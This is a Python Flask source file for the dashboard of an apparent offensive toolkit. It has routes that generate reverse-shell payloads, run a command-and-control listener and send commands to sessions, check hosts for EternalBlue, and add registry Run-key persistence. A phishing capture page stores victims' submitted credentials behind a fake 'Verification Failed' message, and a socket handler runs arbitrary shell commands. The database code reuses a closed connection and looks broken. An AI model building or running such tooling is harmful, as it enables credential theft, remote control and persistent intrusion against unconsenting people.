from flask import Flask, render_template, request, jsonify, send_from_directory
from flask_socketio import SocketIO, emit
import os
import json
import time
import threading
import subprocess

from ..core.engine import Engine
from ..core.database import get_targets, add_target, get_campaigns, get_db
from ..modules.payload.reverse_shell import ReverseShellPayload
from ..modules.c2.listener import C2Listener
from ..modules.exploit.eternalblue import EternalBlue
from ..modules.persistence.registry import RegistryPersistence
from ..modules.phishing.generator import PhishingGenerator
from ..modules.recon import ReconModule
from ..modules.wireless import WirelessModule

app = Flask(__name__, 
            template_folder='../templates',
            static_folder='../static',
            static_url_path='/static')
app.secret_key = 'mysoninja_secret_2024'
socketio = SocketIO(app, cors_allowed_origins='*')

engine = Engine()
c2_listener = C2Listener()

@app.route('/')
def dashboard():
    return render_template('warroom.html')

@app.route('/api/targets', methods=['GET', 'POST'])
def handle_targets():
    if request.method == 'GET':
        return jsonify(get_targets())
    data = request.json
    target_id = add_target(data['type'], data['value'], data.get('notes', ''))
    return jsonify({'success': True, 'id': target_id})

@app.route('/api/campaigns', methods=['GET', 'POST'])
def handle_campaigns():
    if request.method == 'GET':
        return jsonify(get_campaigns())
    data = request.json
    campaign = engine.generate_campaign(
        platform=data['platform'],
        target_email=data.get('target_email'),
        custom_message=data.get('message')
    )
    return jsonify({'success': True, 'campaign': campaign})

@app.route('/api/payloads/reverse_shell', methods=['POST'])
def generate_payload():
    data = request.json
    host = data.get('host', '127.0.0.1')
    port = data.get('port', 4444)
    return jsonify(ReverseShellPayload.all(host, port))

@app.route('/api/c2/start', methods=['POST'])
def start_c2():
    data = request.json
    result = c2_listener.start_tcp(
        host=data.get('host', '0.0.0.0'),
        port=data.get('port', 4444)
    )
    socketio.emit('c2_status', {'status': 'started', 'port': data.get('port', 4444)})
    return jsonify(result)

@app.route('/api/c2/stop', methods=['POST'])
def stop_c2():
    result = c2_listener.stop()
    socketio.emit('c2_status', {'status': 'stopped'})
    return jsonify(result)

@app.route('/api/c2/sessions', methods=['GET'])
def c2_sessions():
    return jsonify({
        'sessions': list(c2_listener.sessions.keys()),
        'count': len(c2_listener.sessions)
    })

@app.route('/api/c2/send', methods=['POST'])
def c2_send():
    data = request.json
    result = c2_listener.send_command(data['session_id'], data['command'])
    return jsonify(result)

@app.route('/api/exploit/eternalblue/check', methods=['POST'])
def check_eternalblue():
    data = request.json
    result = EternalBlue.check_vulnerable(data['host'])
    return jsonify(result)

@app.route('/api/persistence/registry', methods=['POST'])
def add_registry_persistence():
    data = request.json
    result = RegistryPersistence.add_run_key(
        name=data['name'],
        command=data['command'],
        key=data.get('key', 'HKCU')
    )
    return jsonify(result)

@app.route('/api/scan', methods=['POST'])
def run_scan():
    data = request.json
    scan_id = engine.scan_target(data['target'], data.get('type', 'quick'))
    socketio.emit('scan_started', {'scan_id': scan_id, 'target': data['target']})
    return jsonify({'success': True, 'scan_id': scan_id})

@app.route('/api/scan/<scan_id>', methods=['GET'])
def scan_status(scan_id):
    return jsonify(engine.get_scan_status(scan_id))

@app.route('/api/stats', methods=['GET'])
def stats():
    return jsonify(engine.get_stats())

@app.route('/api/recon/dns', methods=['POST'])
def dns_recon():
    data = request.json
    result = ReconModule.dns_lookup(data['domain'])
    return jsonify(result)

@app.route('/api/recon/ports', methods=['POST'])
def port_recon():
    data = request.json
    result = ReconModule.port_scan(data['host'])
    return jsonify({'open_ports': result})

@app.route('/api/recon/subdomain', methods=['POST'])
def subdomain_recon():
    data = request.json
    result = ReconModule.subdomain_enum(data['domain'])
    return jsonify({'subdomains': result})

@app.route('/api/wireless/interfaces', methods=['GET'])
def wifi_interfaces():
    return jsonify({'interfaces': WirelessModule.list_interfaces()})

@app.route('/api/wireless/scan', methods=['POST'])
def wifi_scan():
    data = request.json
    networks = WirelessModule.scan_networks(data['interface'])
    return jsonify({'networks': networks})

@app.route('/capture/<campaign_id>', methods=['GET', 'POST'])
def capture_page(campaign_id):
    if request.method == 'POST':
        data = {k: v for k, v in request.form.items()}
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute(
            'INSERT INTO callbacks (session_id, ip, data) VALUES (?, ?, ?)',
            (campaign_id, request.remote_addr, json.dumps(data))
        )
        conn.commit()
        conn.close()
        cursor = conn.cursor()
        cursor.execute('UPDATE campaigns SET credentials_captured = credentials_captured + 1 WHERE id = ?', (campaign_id,))
        conn.commit()
        conn.close()
        socketio.emit('capture', {
            'campaign_id': campaign_id,
            'ip': request.remote_addr,
            'data': data
        })
        return '''
        <html><body style="font-family:Arial;text-align:center;padding:50px;">
            <h2>⚠️ Verification Failed</h2>
            <p>Please try again later.</p>
        </body></html>
        '''
    
    # Serve phishing page
    campaign_dir = os.path.join(os.path.dirname(__file__), '../../campaigns', str(campaign_id))
    if os.path.exists(os.path.join(campaign_dir, 'index.html')):
        return send_from_directory(campaign_dir, 'index.html')
    return '<h1>Campaign not found</h1>', 404

@app.route('/track/<campaign_id>', methods=['GET', 'POST'])
def track_campaign(campaign_id):
    if request.method == 'POST':
        data = request.get_json() or {}
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute(
            'INSERT INTO callbacks (session_id, ip, data) VALUES (?, ?, ?)',
            (campaign_id, request.remote_addr, json.dumps(data))
        )
        conn.commit()
        conn.close()
        cursor = conn.cursor()
        cursor.execute('UPDATE campaigns SET visitors = visitors + 1 WHERE id = ?', (campaign_id,))
        conn.commit()
        conn.close()
        return jsonify({'status': 'tracked'})
    # GET tracking pixel
    pixel = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'
    return pixel, 200, {'Content-Type': 'image/gif'}

@socketio.on('connect')
def handle_connect():
    emit('connected', {'status': 'connected to war room'})

@socketio.on('command')
def handle_command(data):
    # Execute shell command from UI
    cmd = data.get('cmd', '')
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        emit('command_result', {
            'cmd': cmd,
            'output': result.stdout + result.stderr,
            'code': result.returncode
        })
    except Exception as e:
        emit('command_result', {'cmd': cmd, 'output': str(e), 'code': -1})

def run_app():
    socketio.run(app, host='127.0.0.1', port=5000, debug=False)
